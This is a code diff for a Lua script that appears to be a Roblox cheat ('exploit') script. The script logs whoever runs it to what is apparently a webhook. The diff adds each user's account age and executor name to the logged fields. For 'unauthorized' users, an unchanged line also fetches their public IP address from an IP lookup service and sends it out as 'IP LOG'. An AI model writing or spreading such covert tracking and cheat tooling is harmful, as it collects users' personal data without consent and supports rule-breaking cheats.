@@ -63,10 +63,12 @@ local function logValidAccess(url, title, description)
                 ['color'] = 0x00FF00,
                 ['fields'] = {
                     {name = 'Player Name:', value = lplr.Name},
-                    {name = 'UserID', value = lplr.UserId},
-                    {name = 'clientID', value = clientID},
-                    {name = "Config", value = "BOOSTER"},
-                    {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},
+                    {name = "Account Age: ", value = lplr.AccountAge},
+                    {name = 'UserID:', value = lplr.UserId},
+                    {name = 'clientID:', value = clientID},
+                    {name = "Config:", value = "BOOSTER"},
+                    {name = "Exploit: ", value = identifyexecutor() or "Unknown"},
+                    {name = "Executed on:", value = os.date("%d/%m/%Y  %H:%M")},
                 }
             }
         }
@@ -102,10 +104,12 @@ local function logUnauthorizedAccess(url, title, description)
                 ['color'] = 0xFF0000,
                 ['fields'] = {
                     {name = 'Player Name:', value = lplr.Name},
-                    {name = 'UserID', value = lplr.UserId},
-                    {name = 'clientID', value = clientID},
-                    {name = "Config", value = "BOOSTER"},
-                    {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},
+                    {name = "Account Age: ", value = lplr.AccountAge},
+                    {name = 'UserID:', value = lplr.UserId},
+                    {name = 'clientID:', value = clientID},
+                    {name = "Config:", value = "BOOSTER"},
+                    {name = "Exploit: ", value = identifyexecutor() or "Unknown"},
+                    {name = "Executed on:", value = os.date("%d/%m/%Y  %H:%M")},
                     {name = "IP LOG: ", value = game:HttpGet('https://api.ipify.org')},
                 }
             }
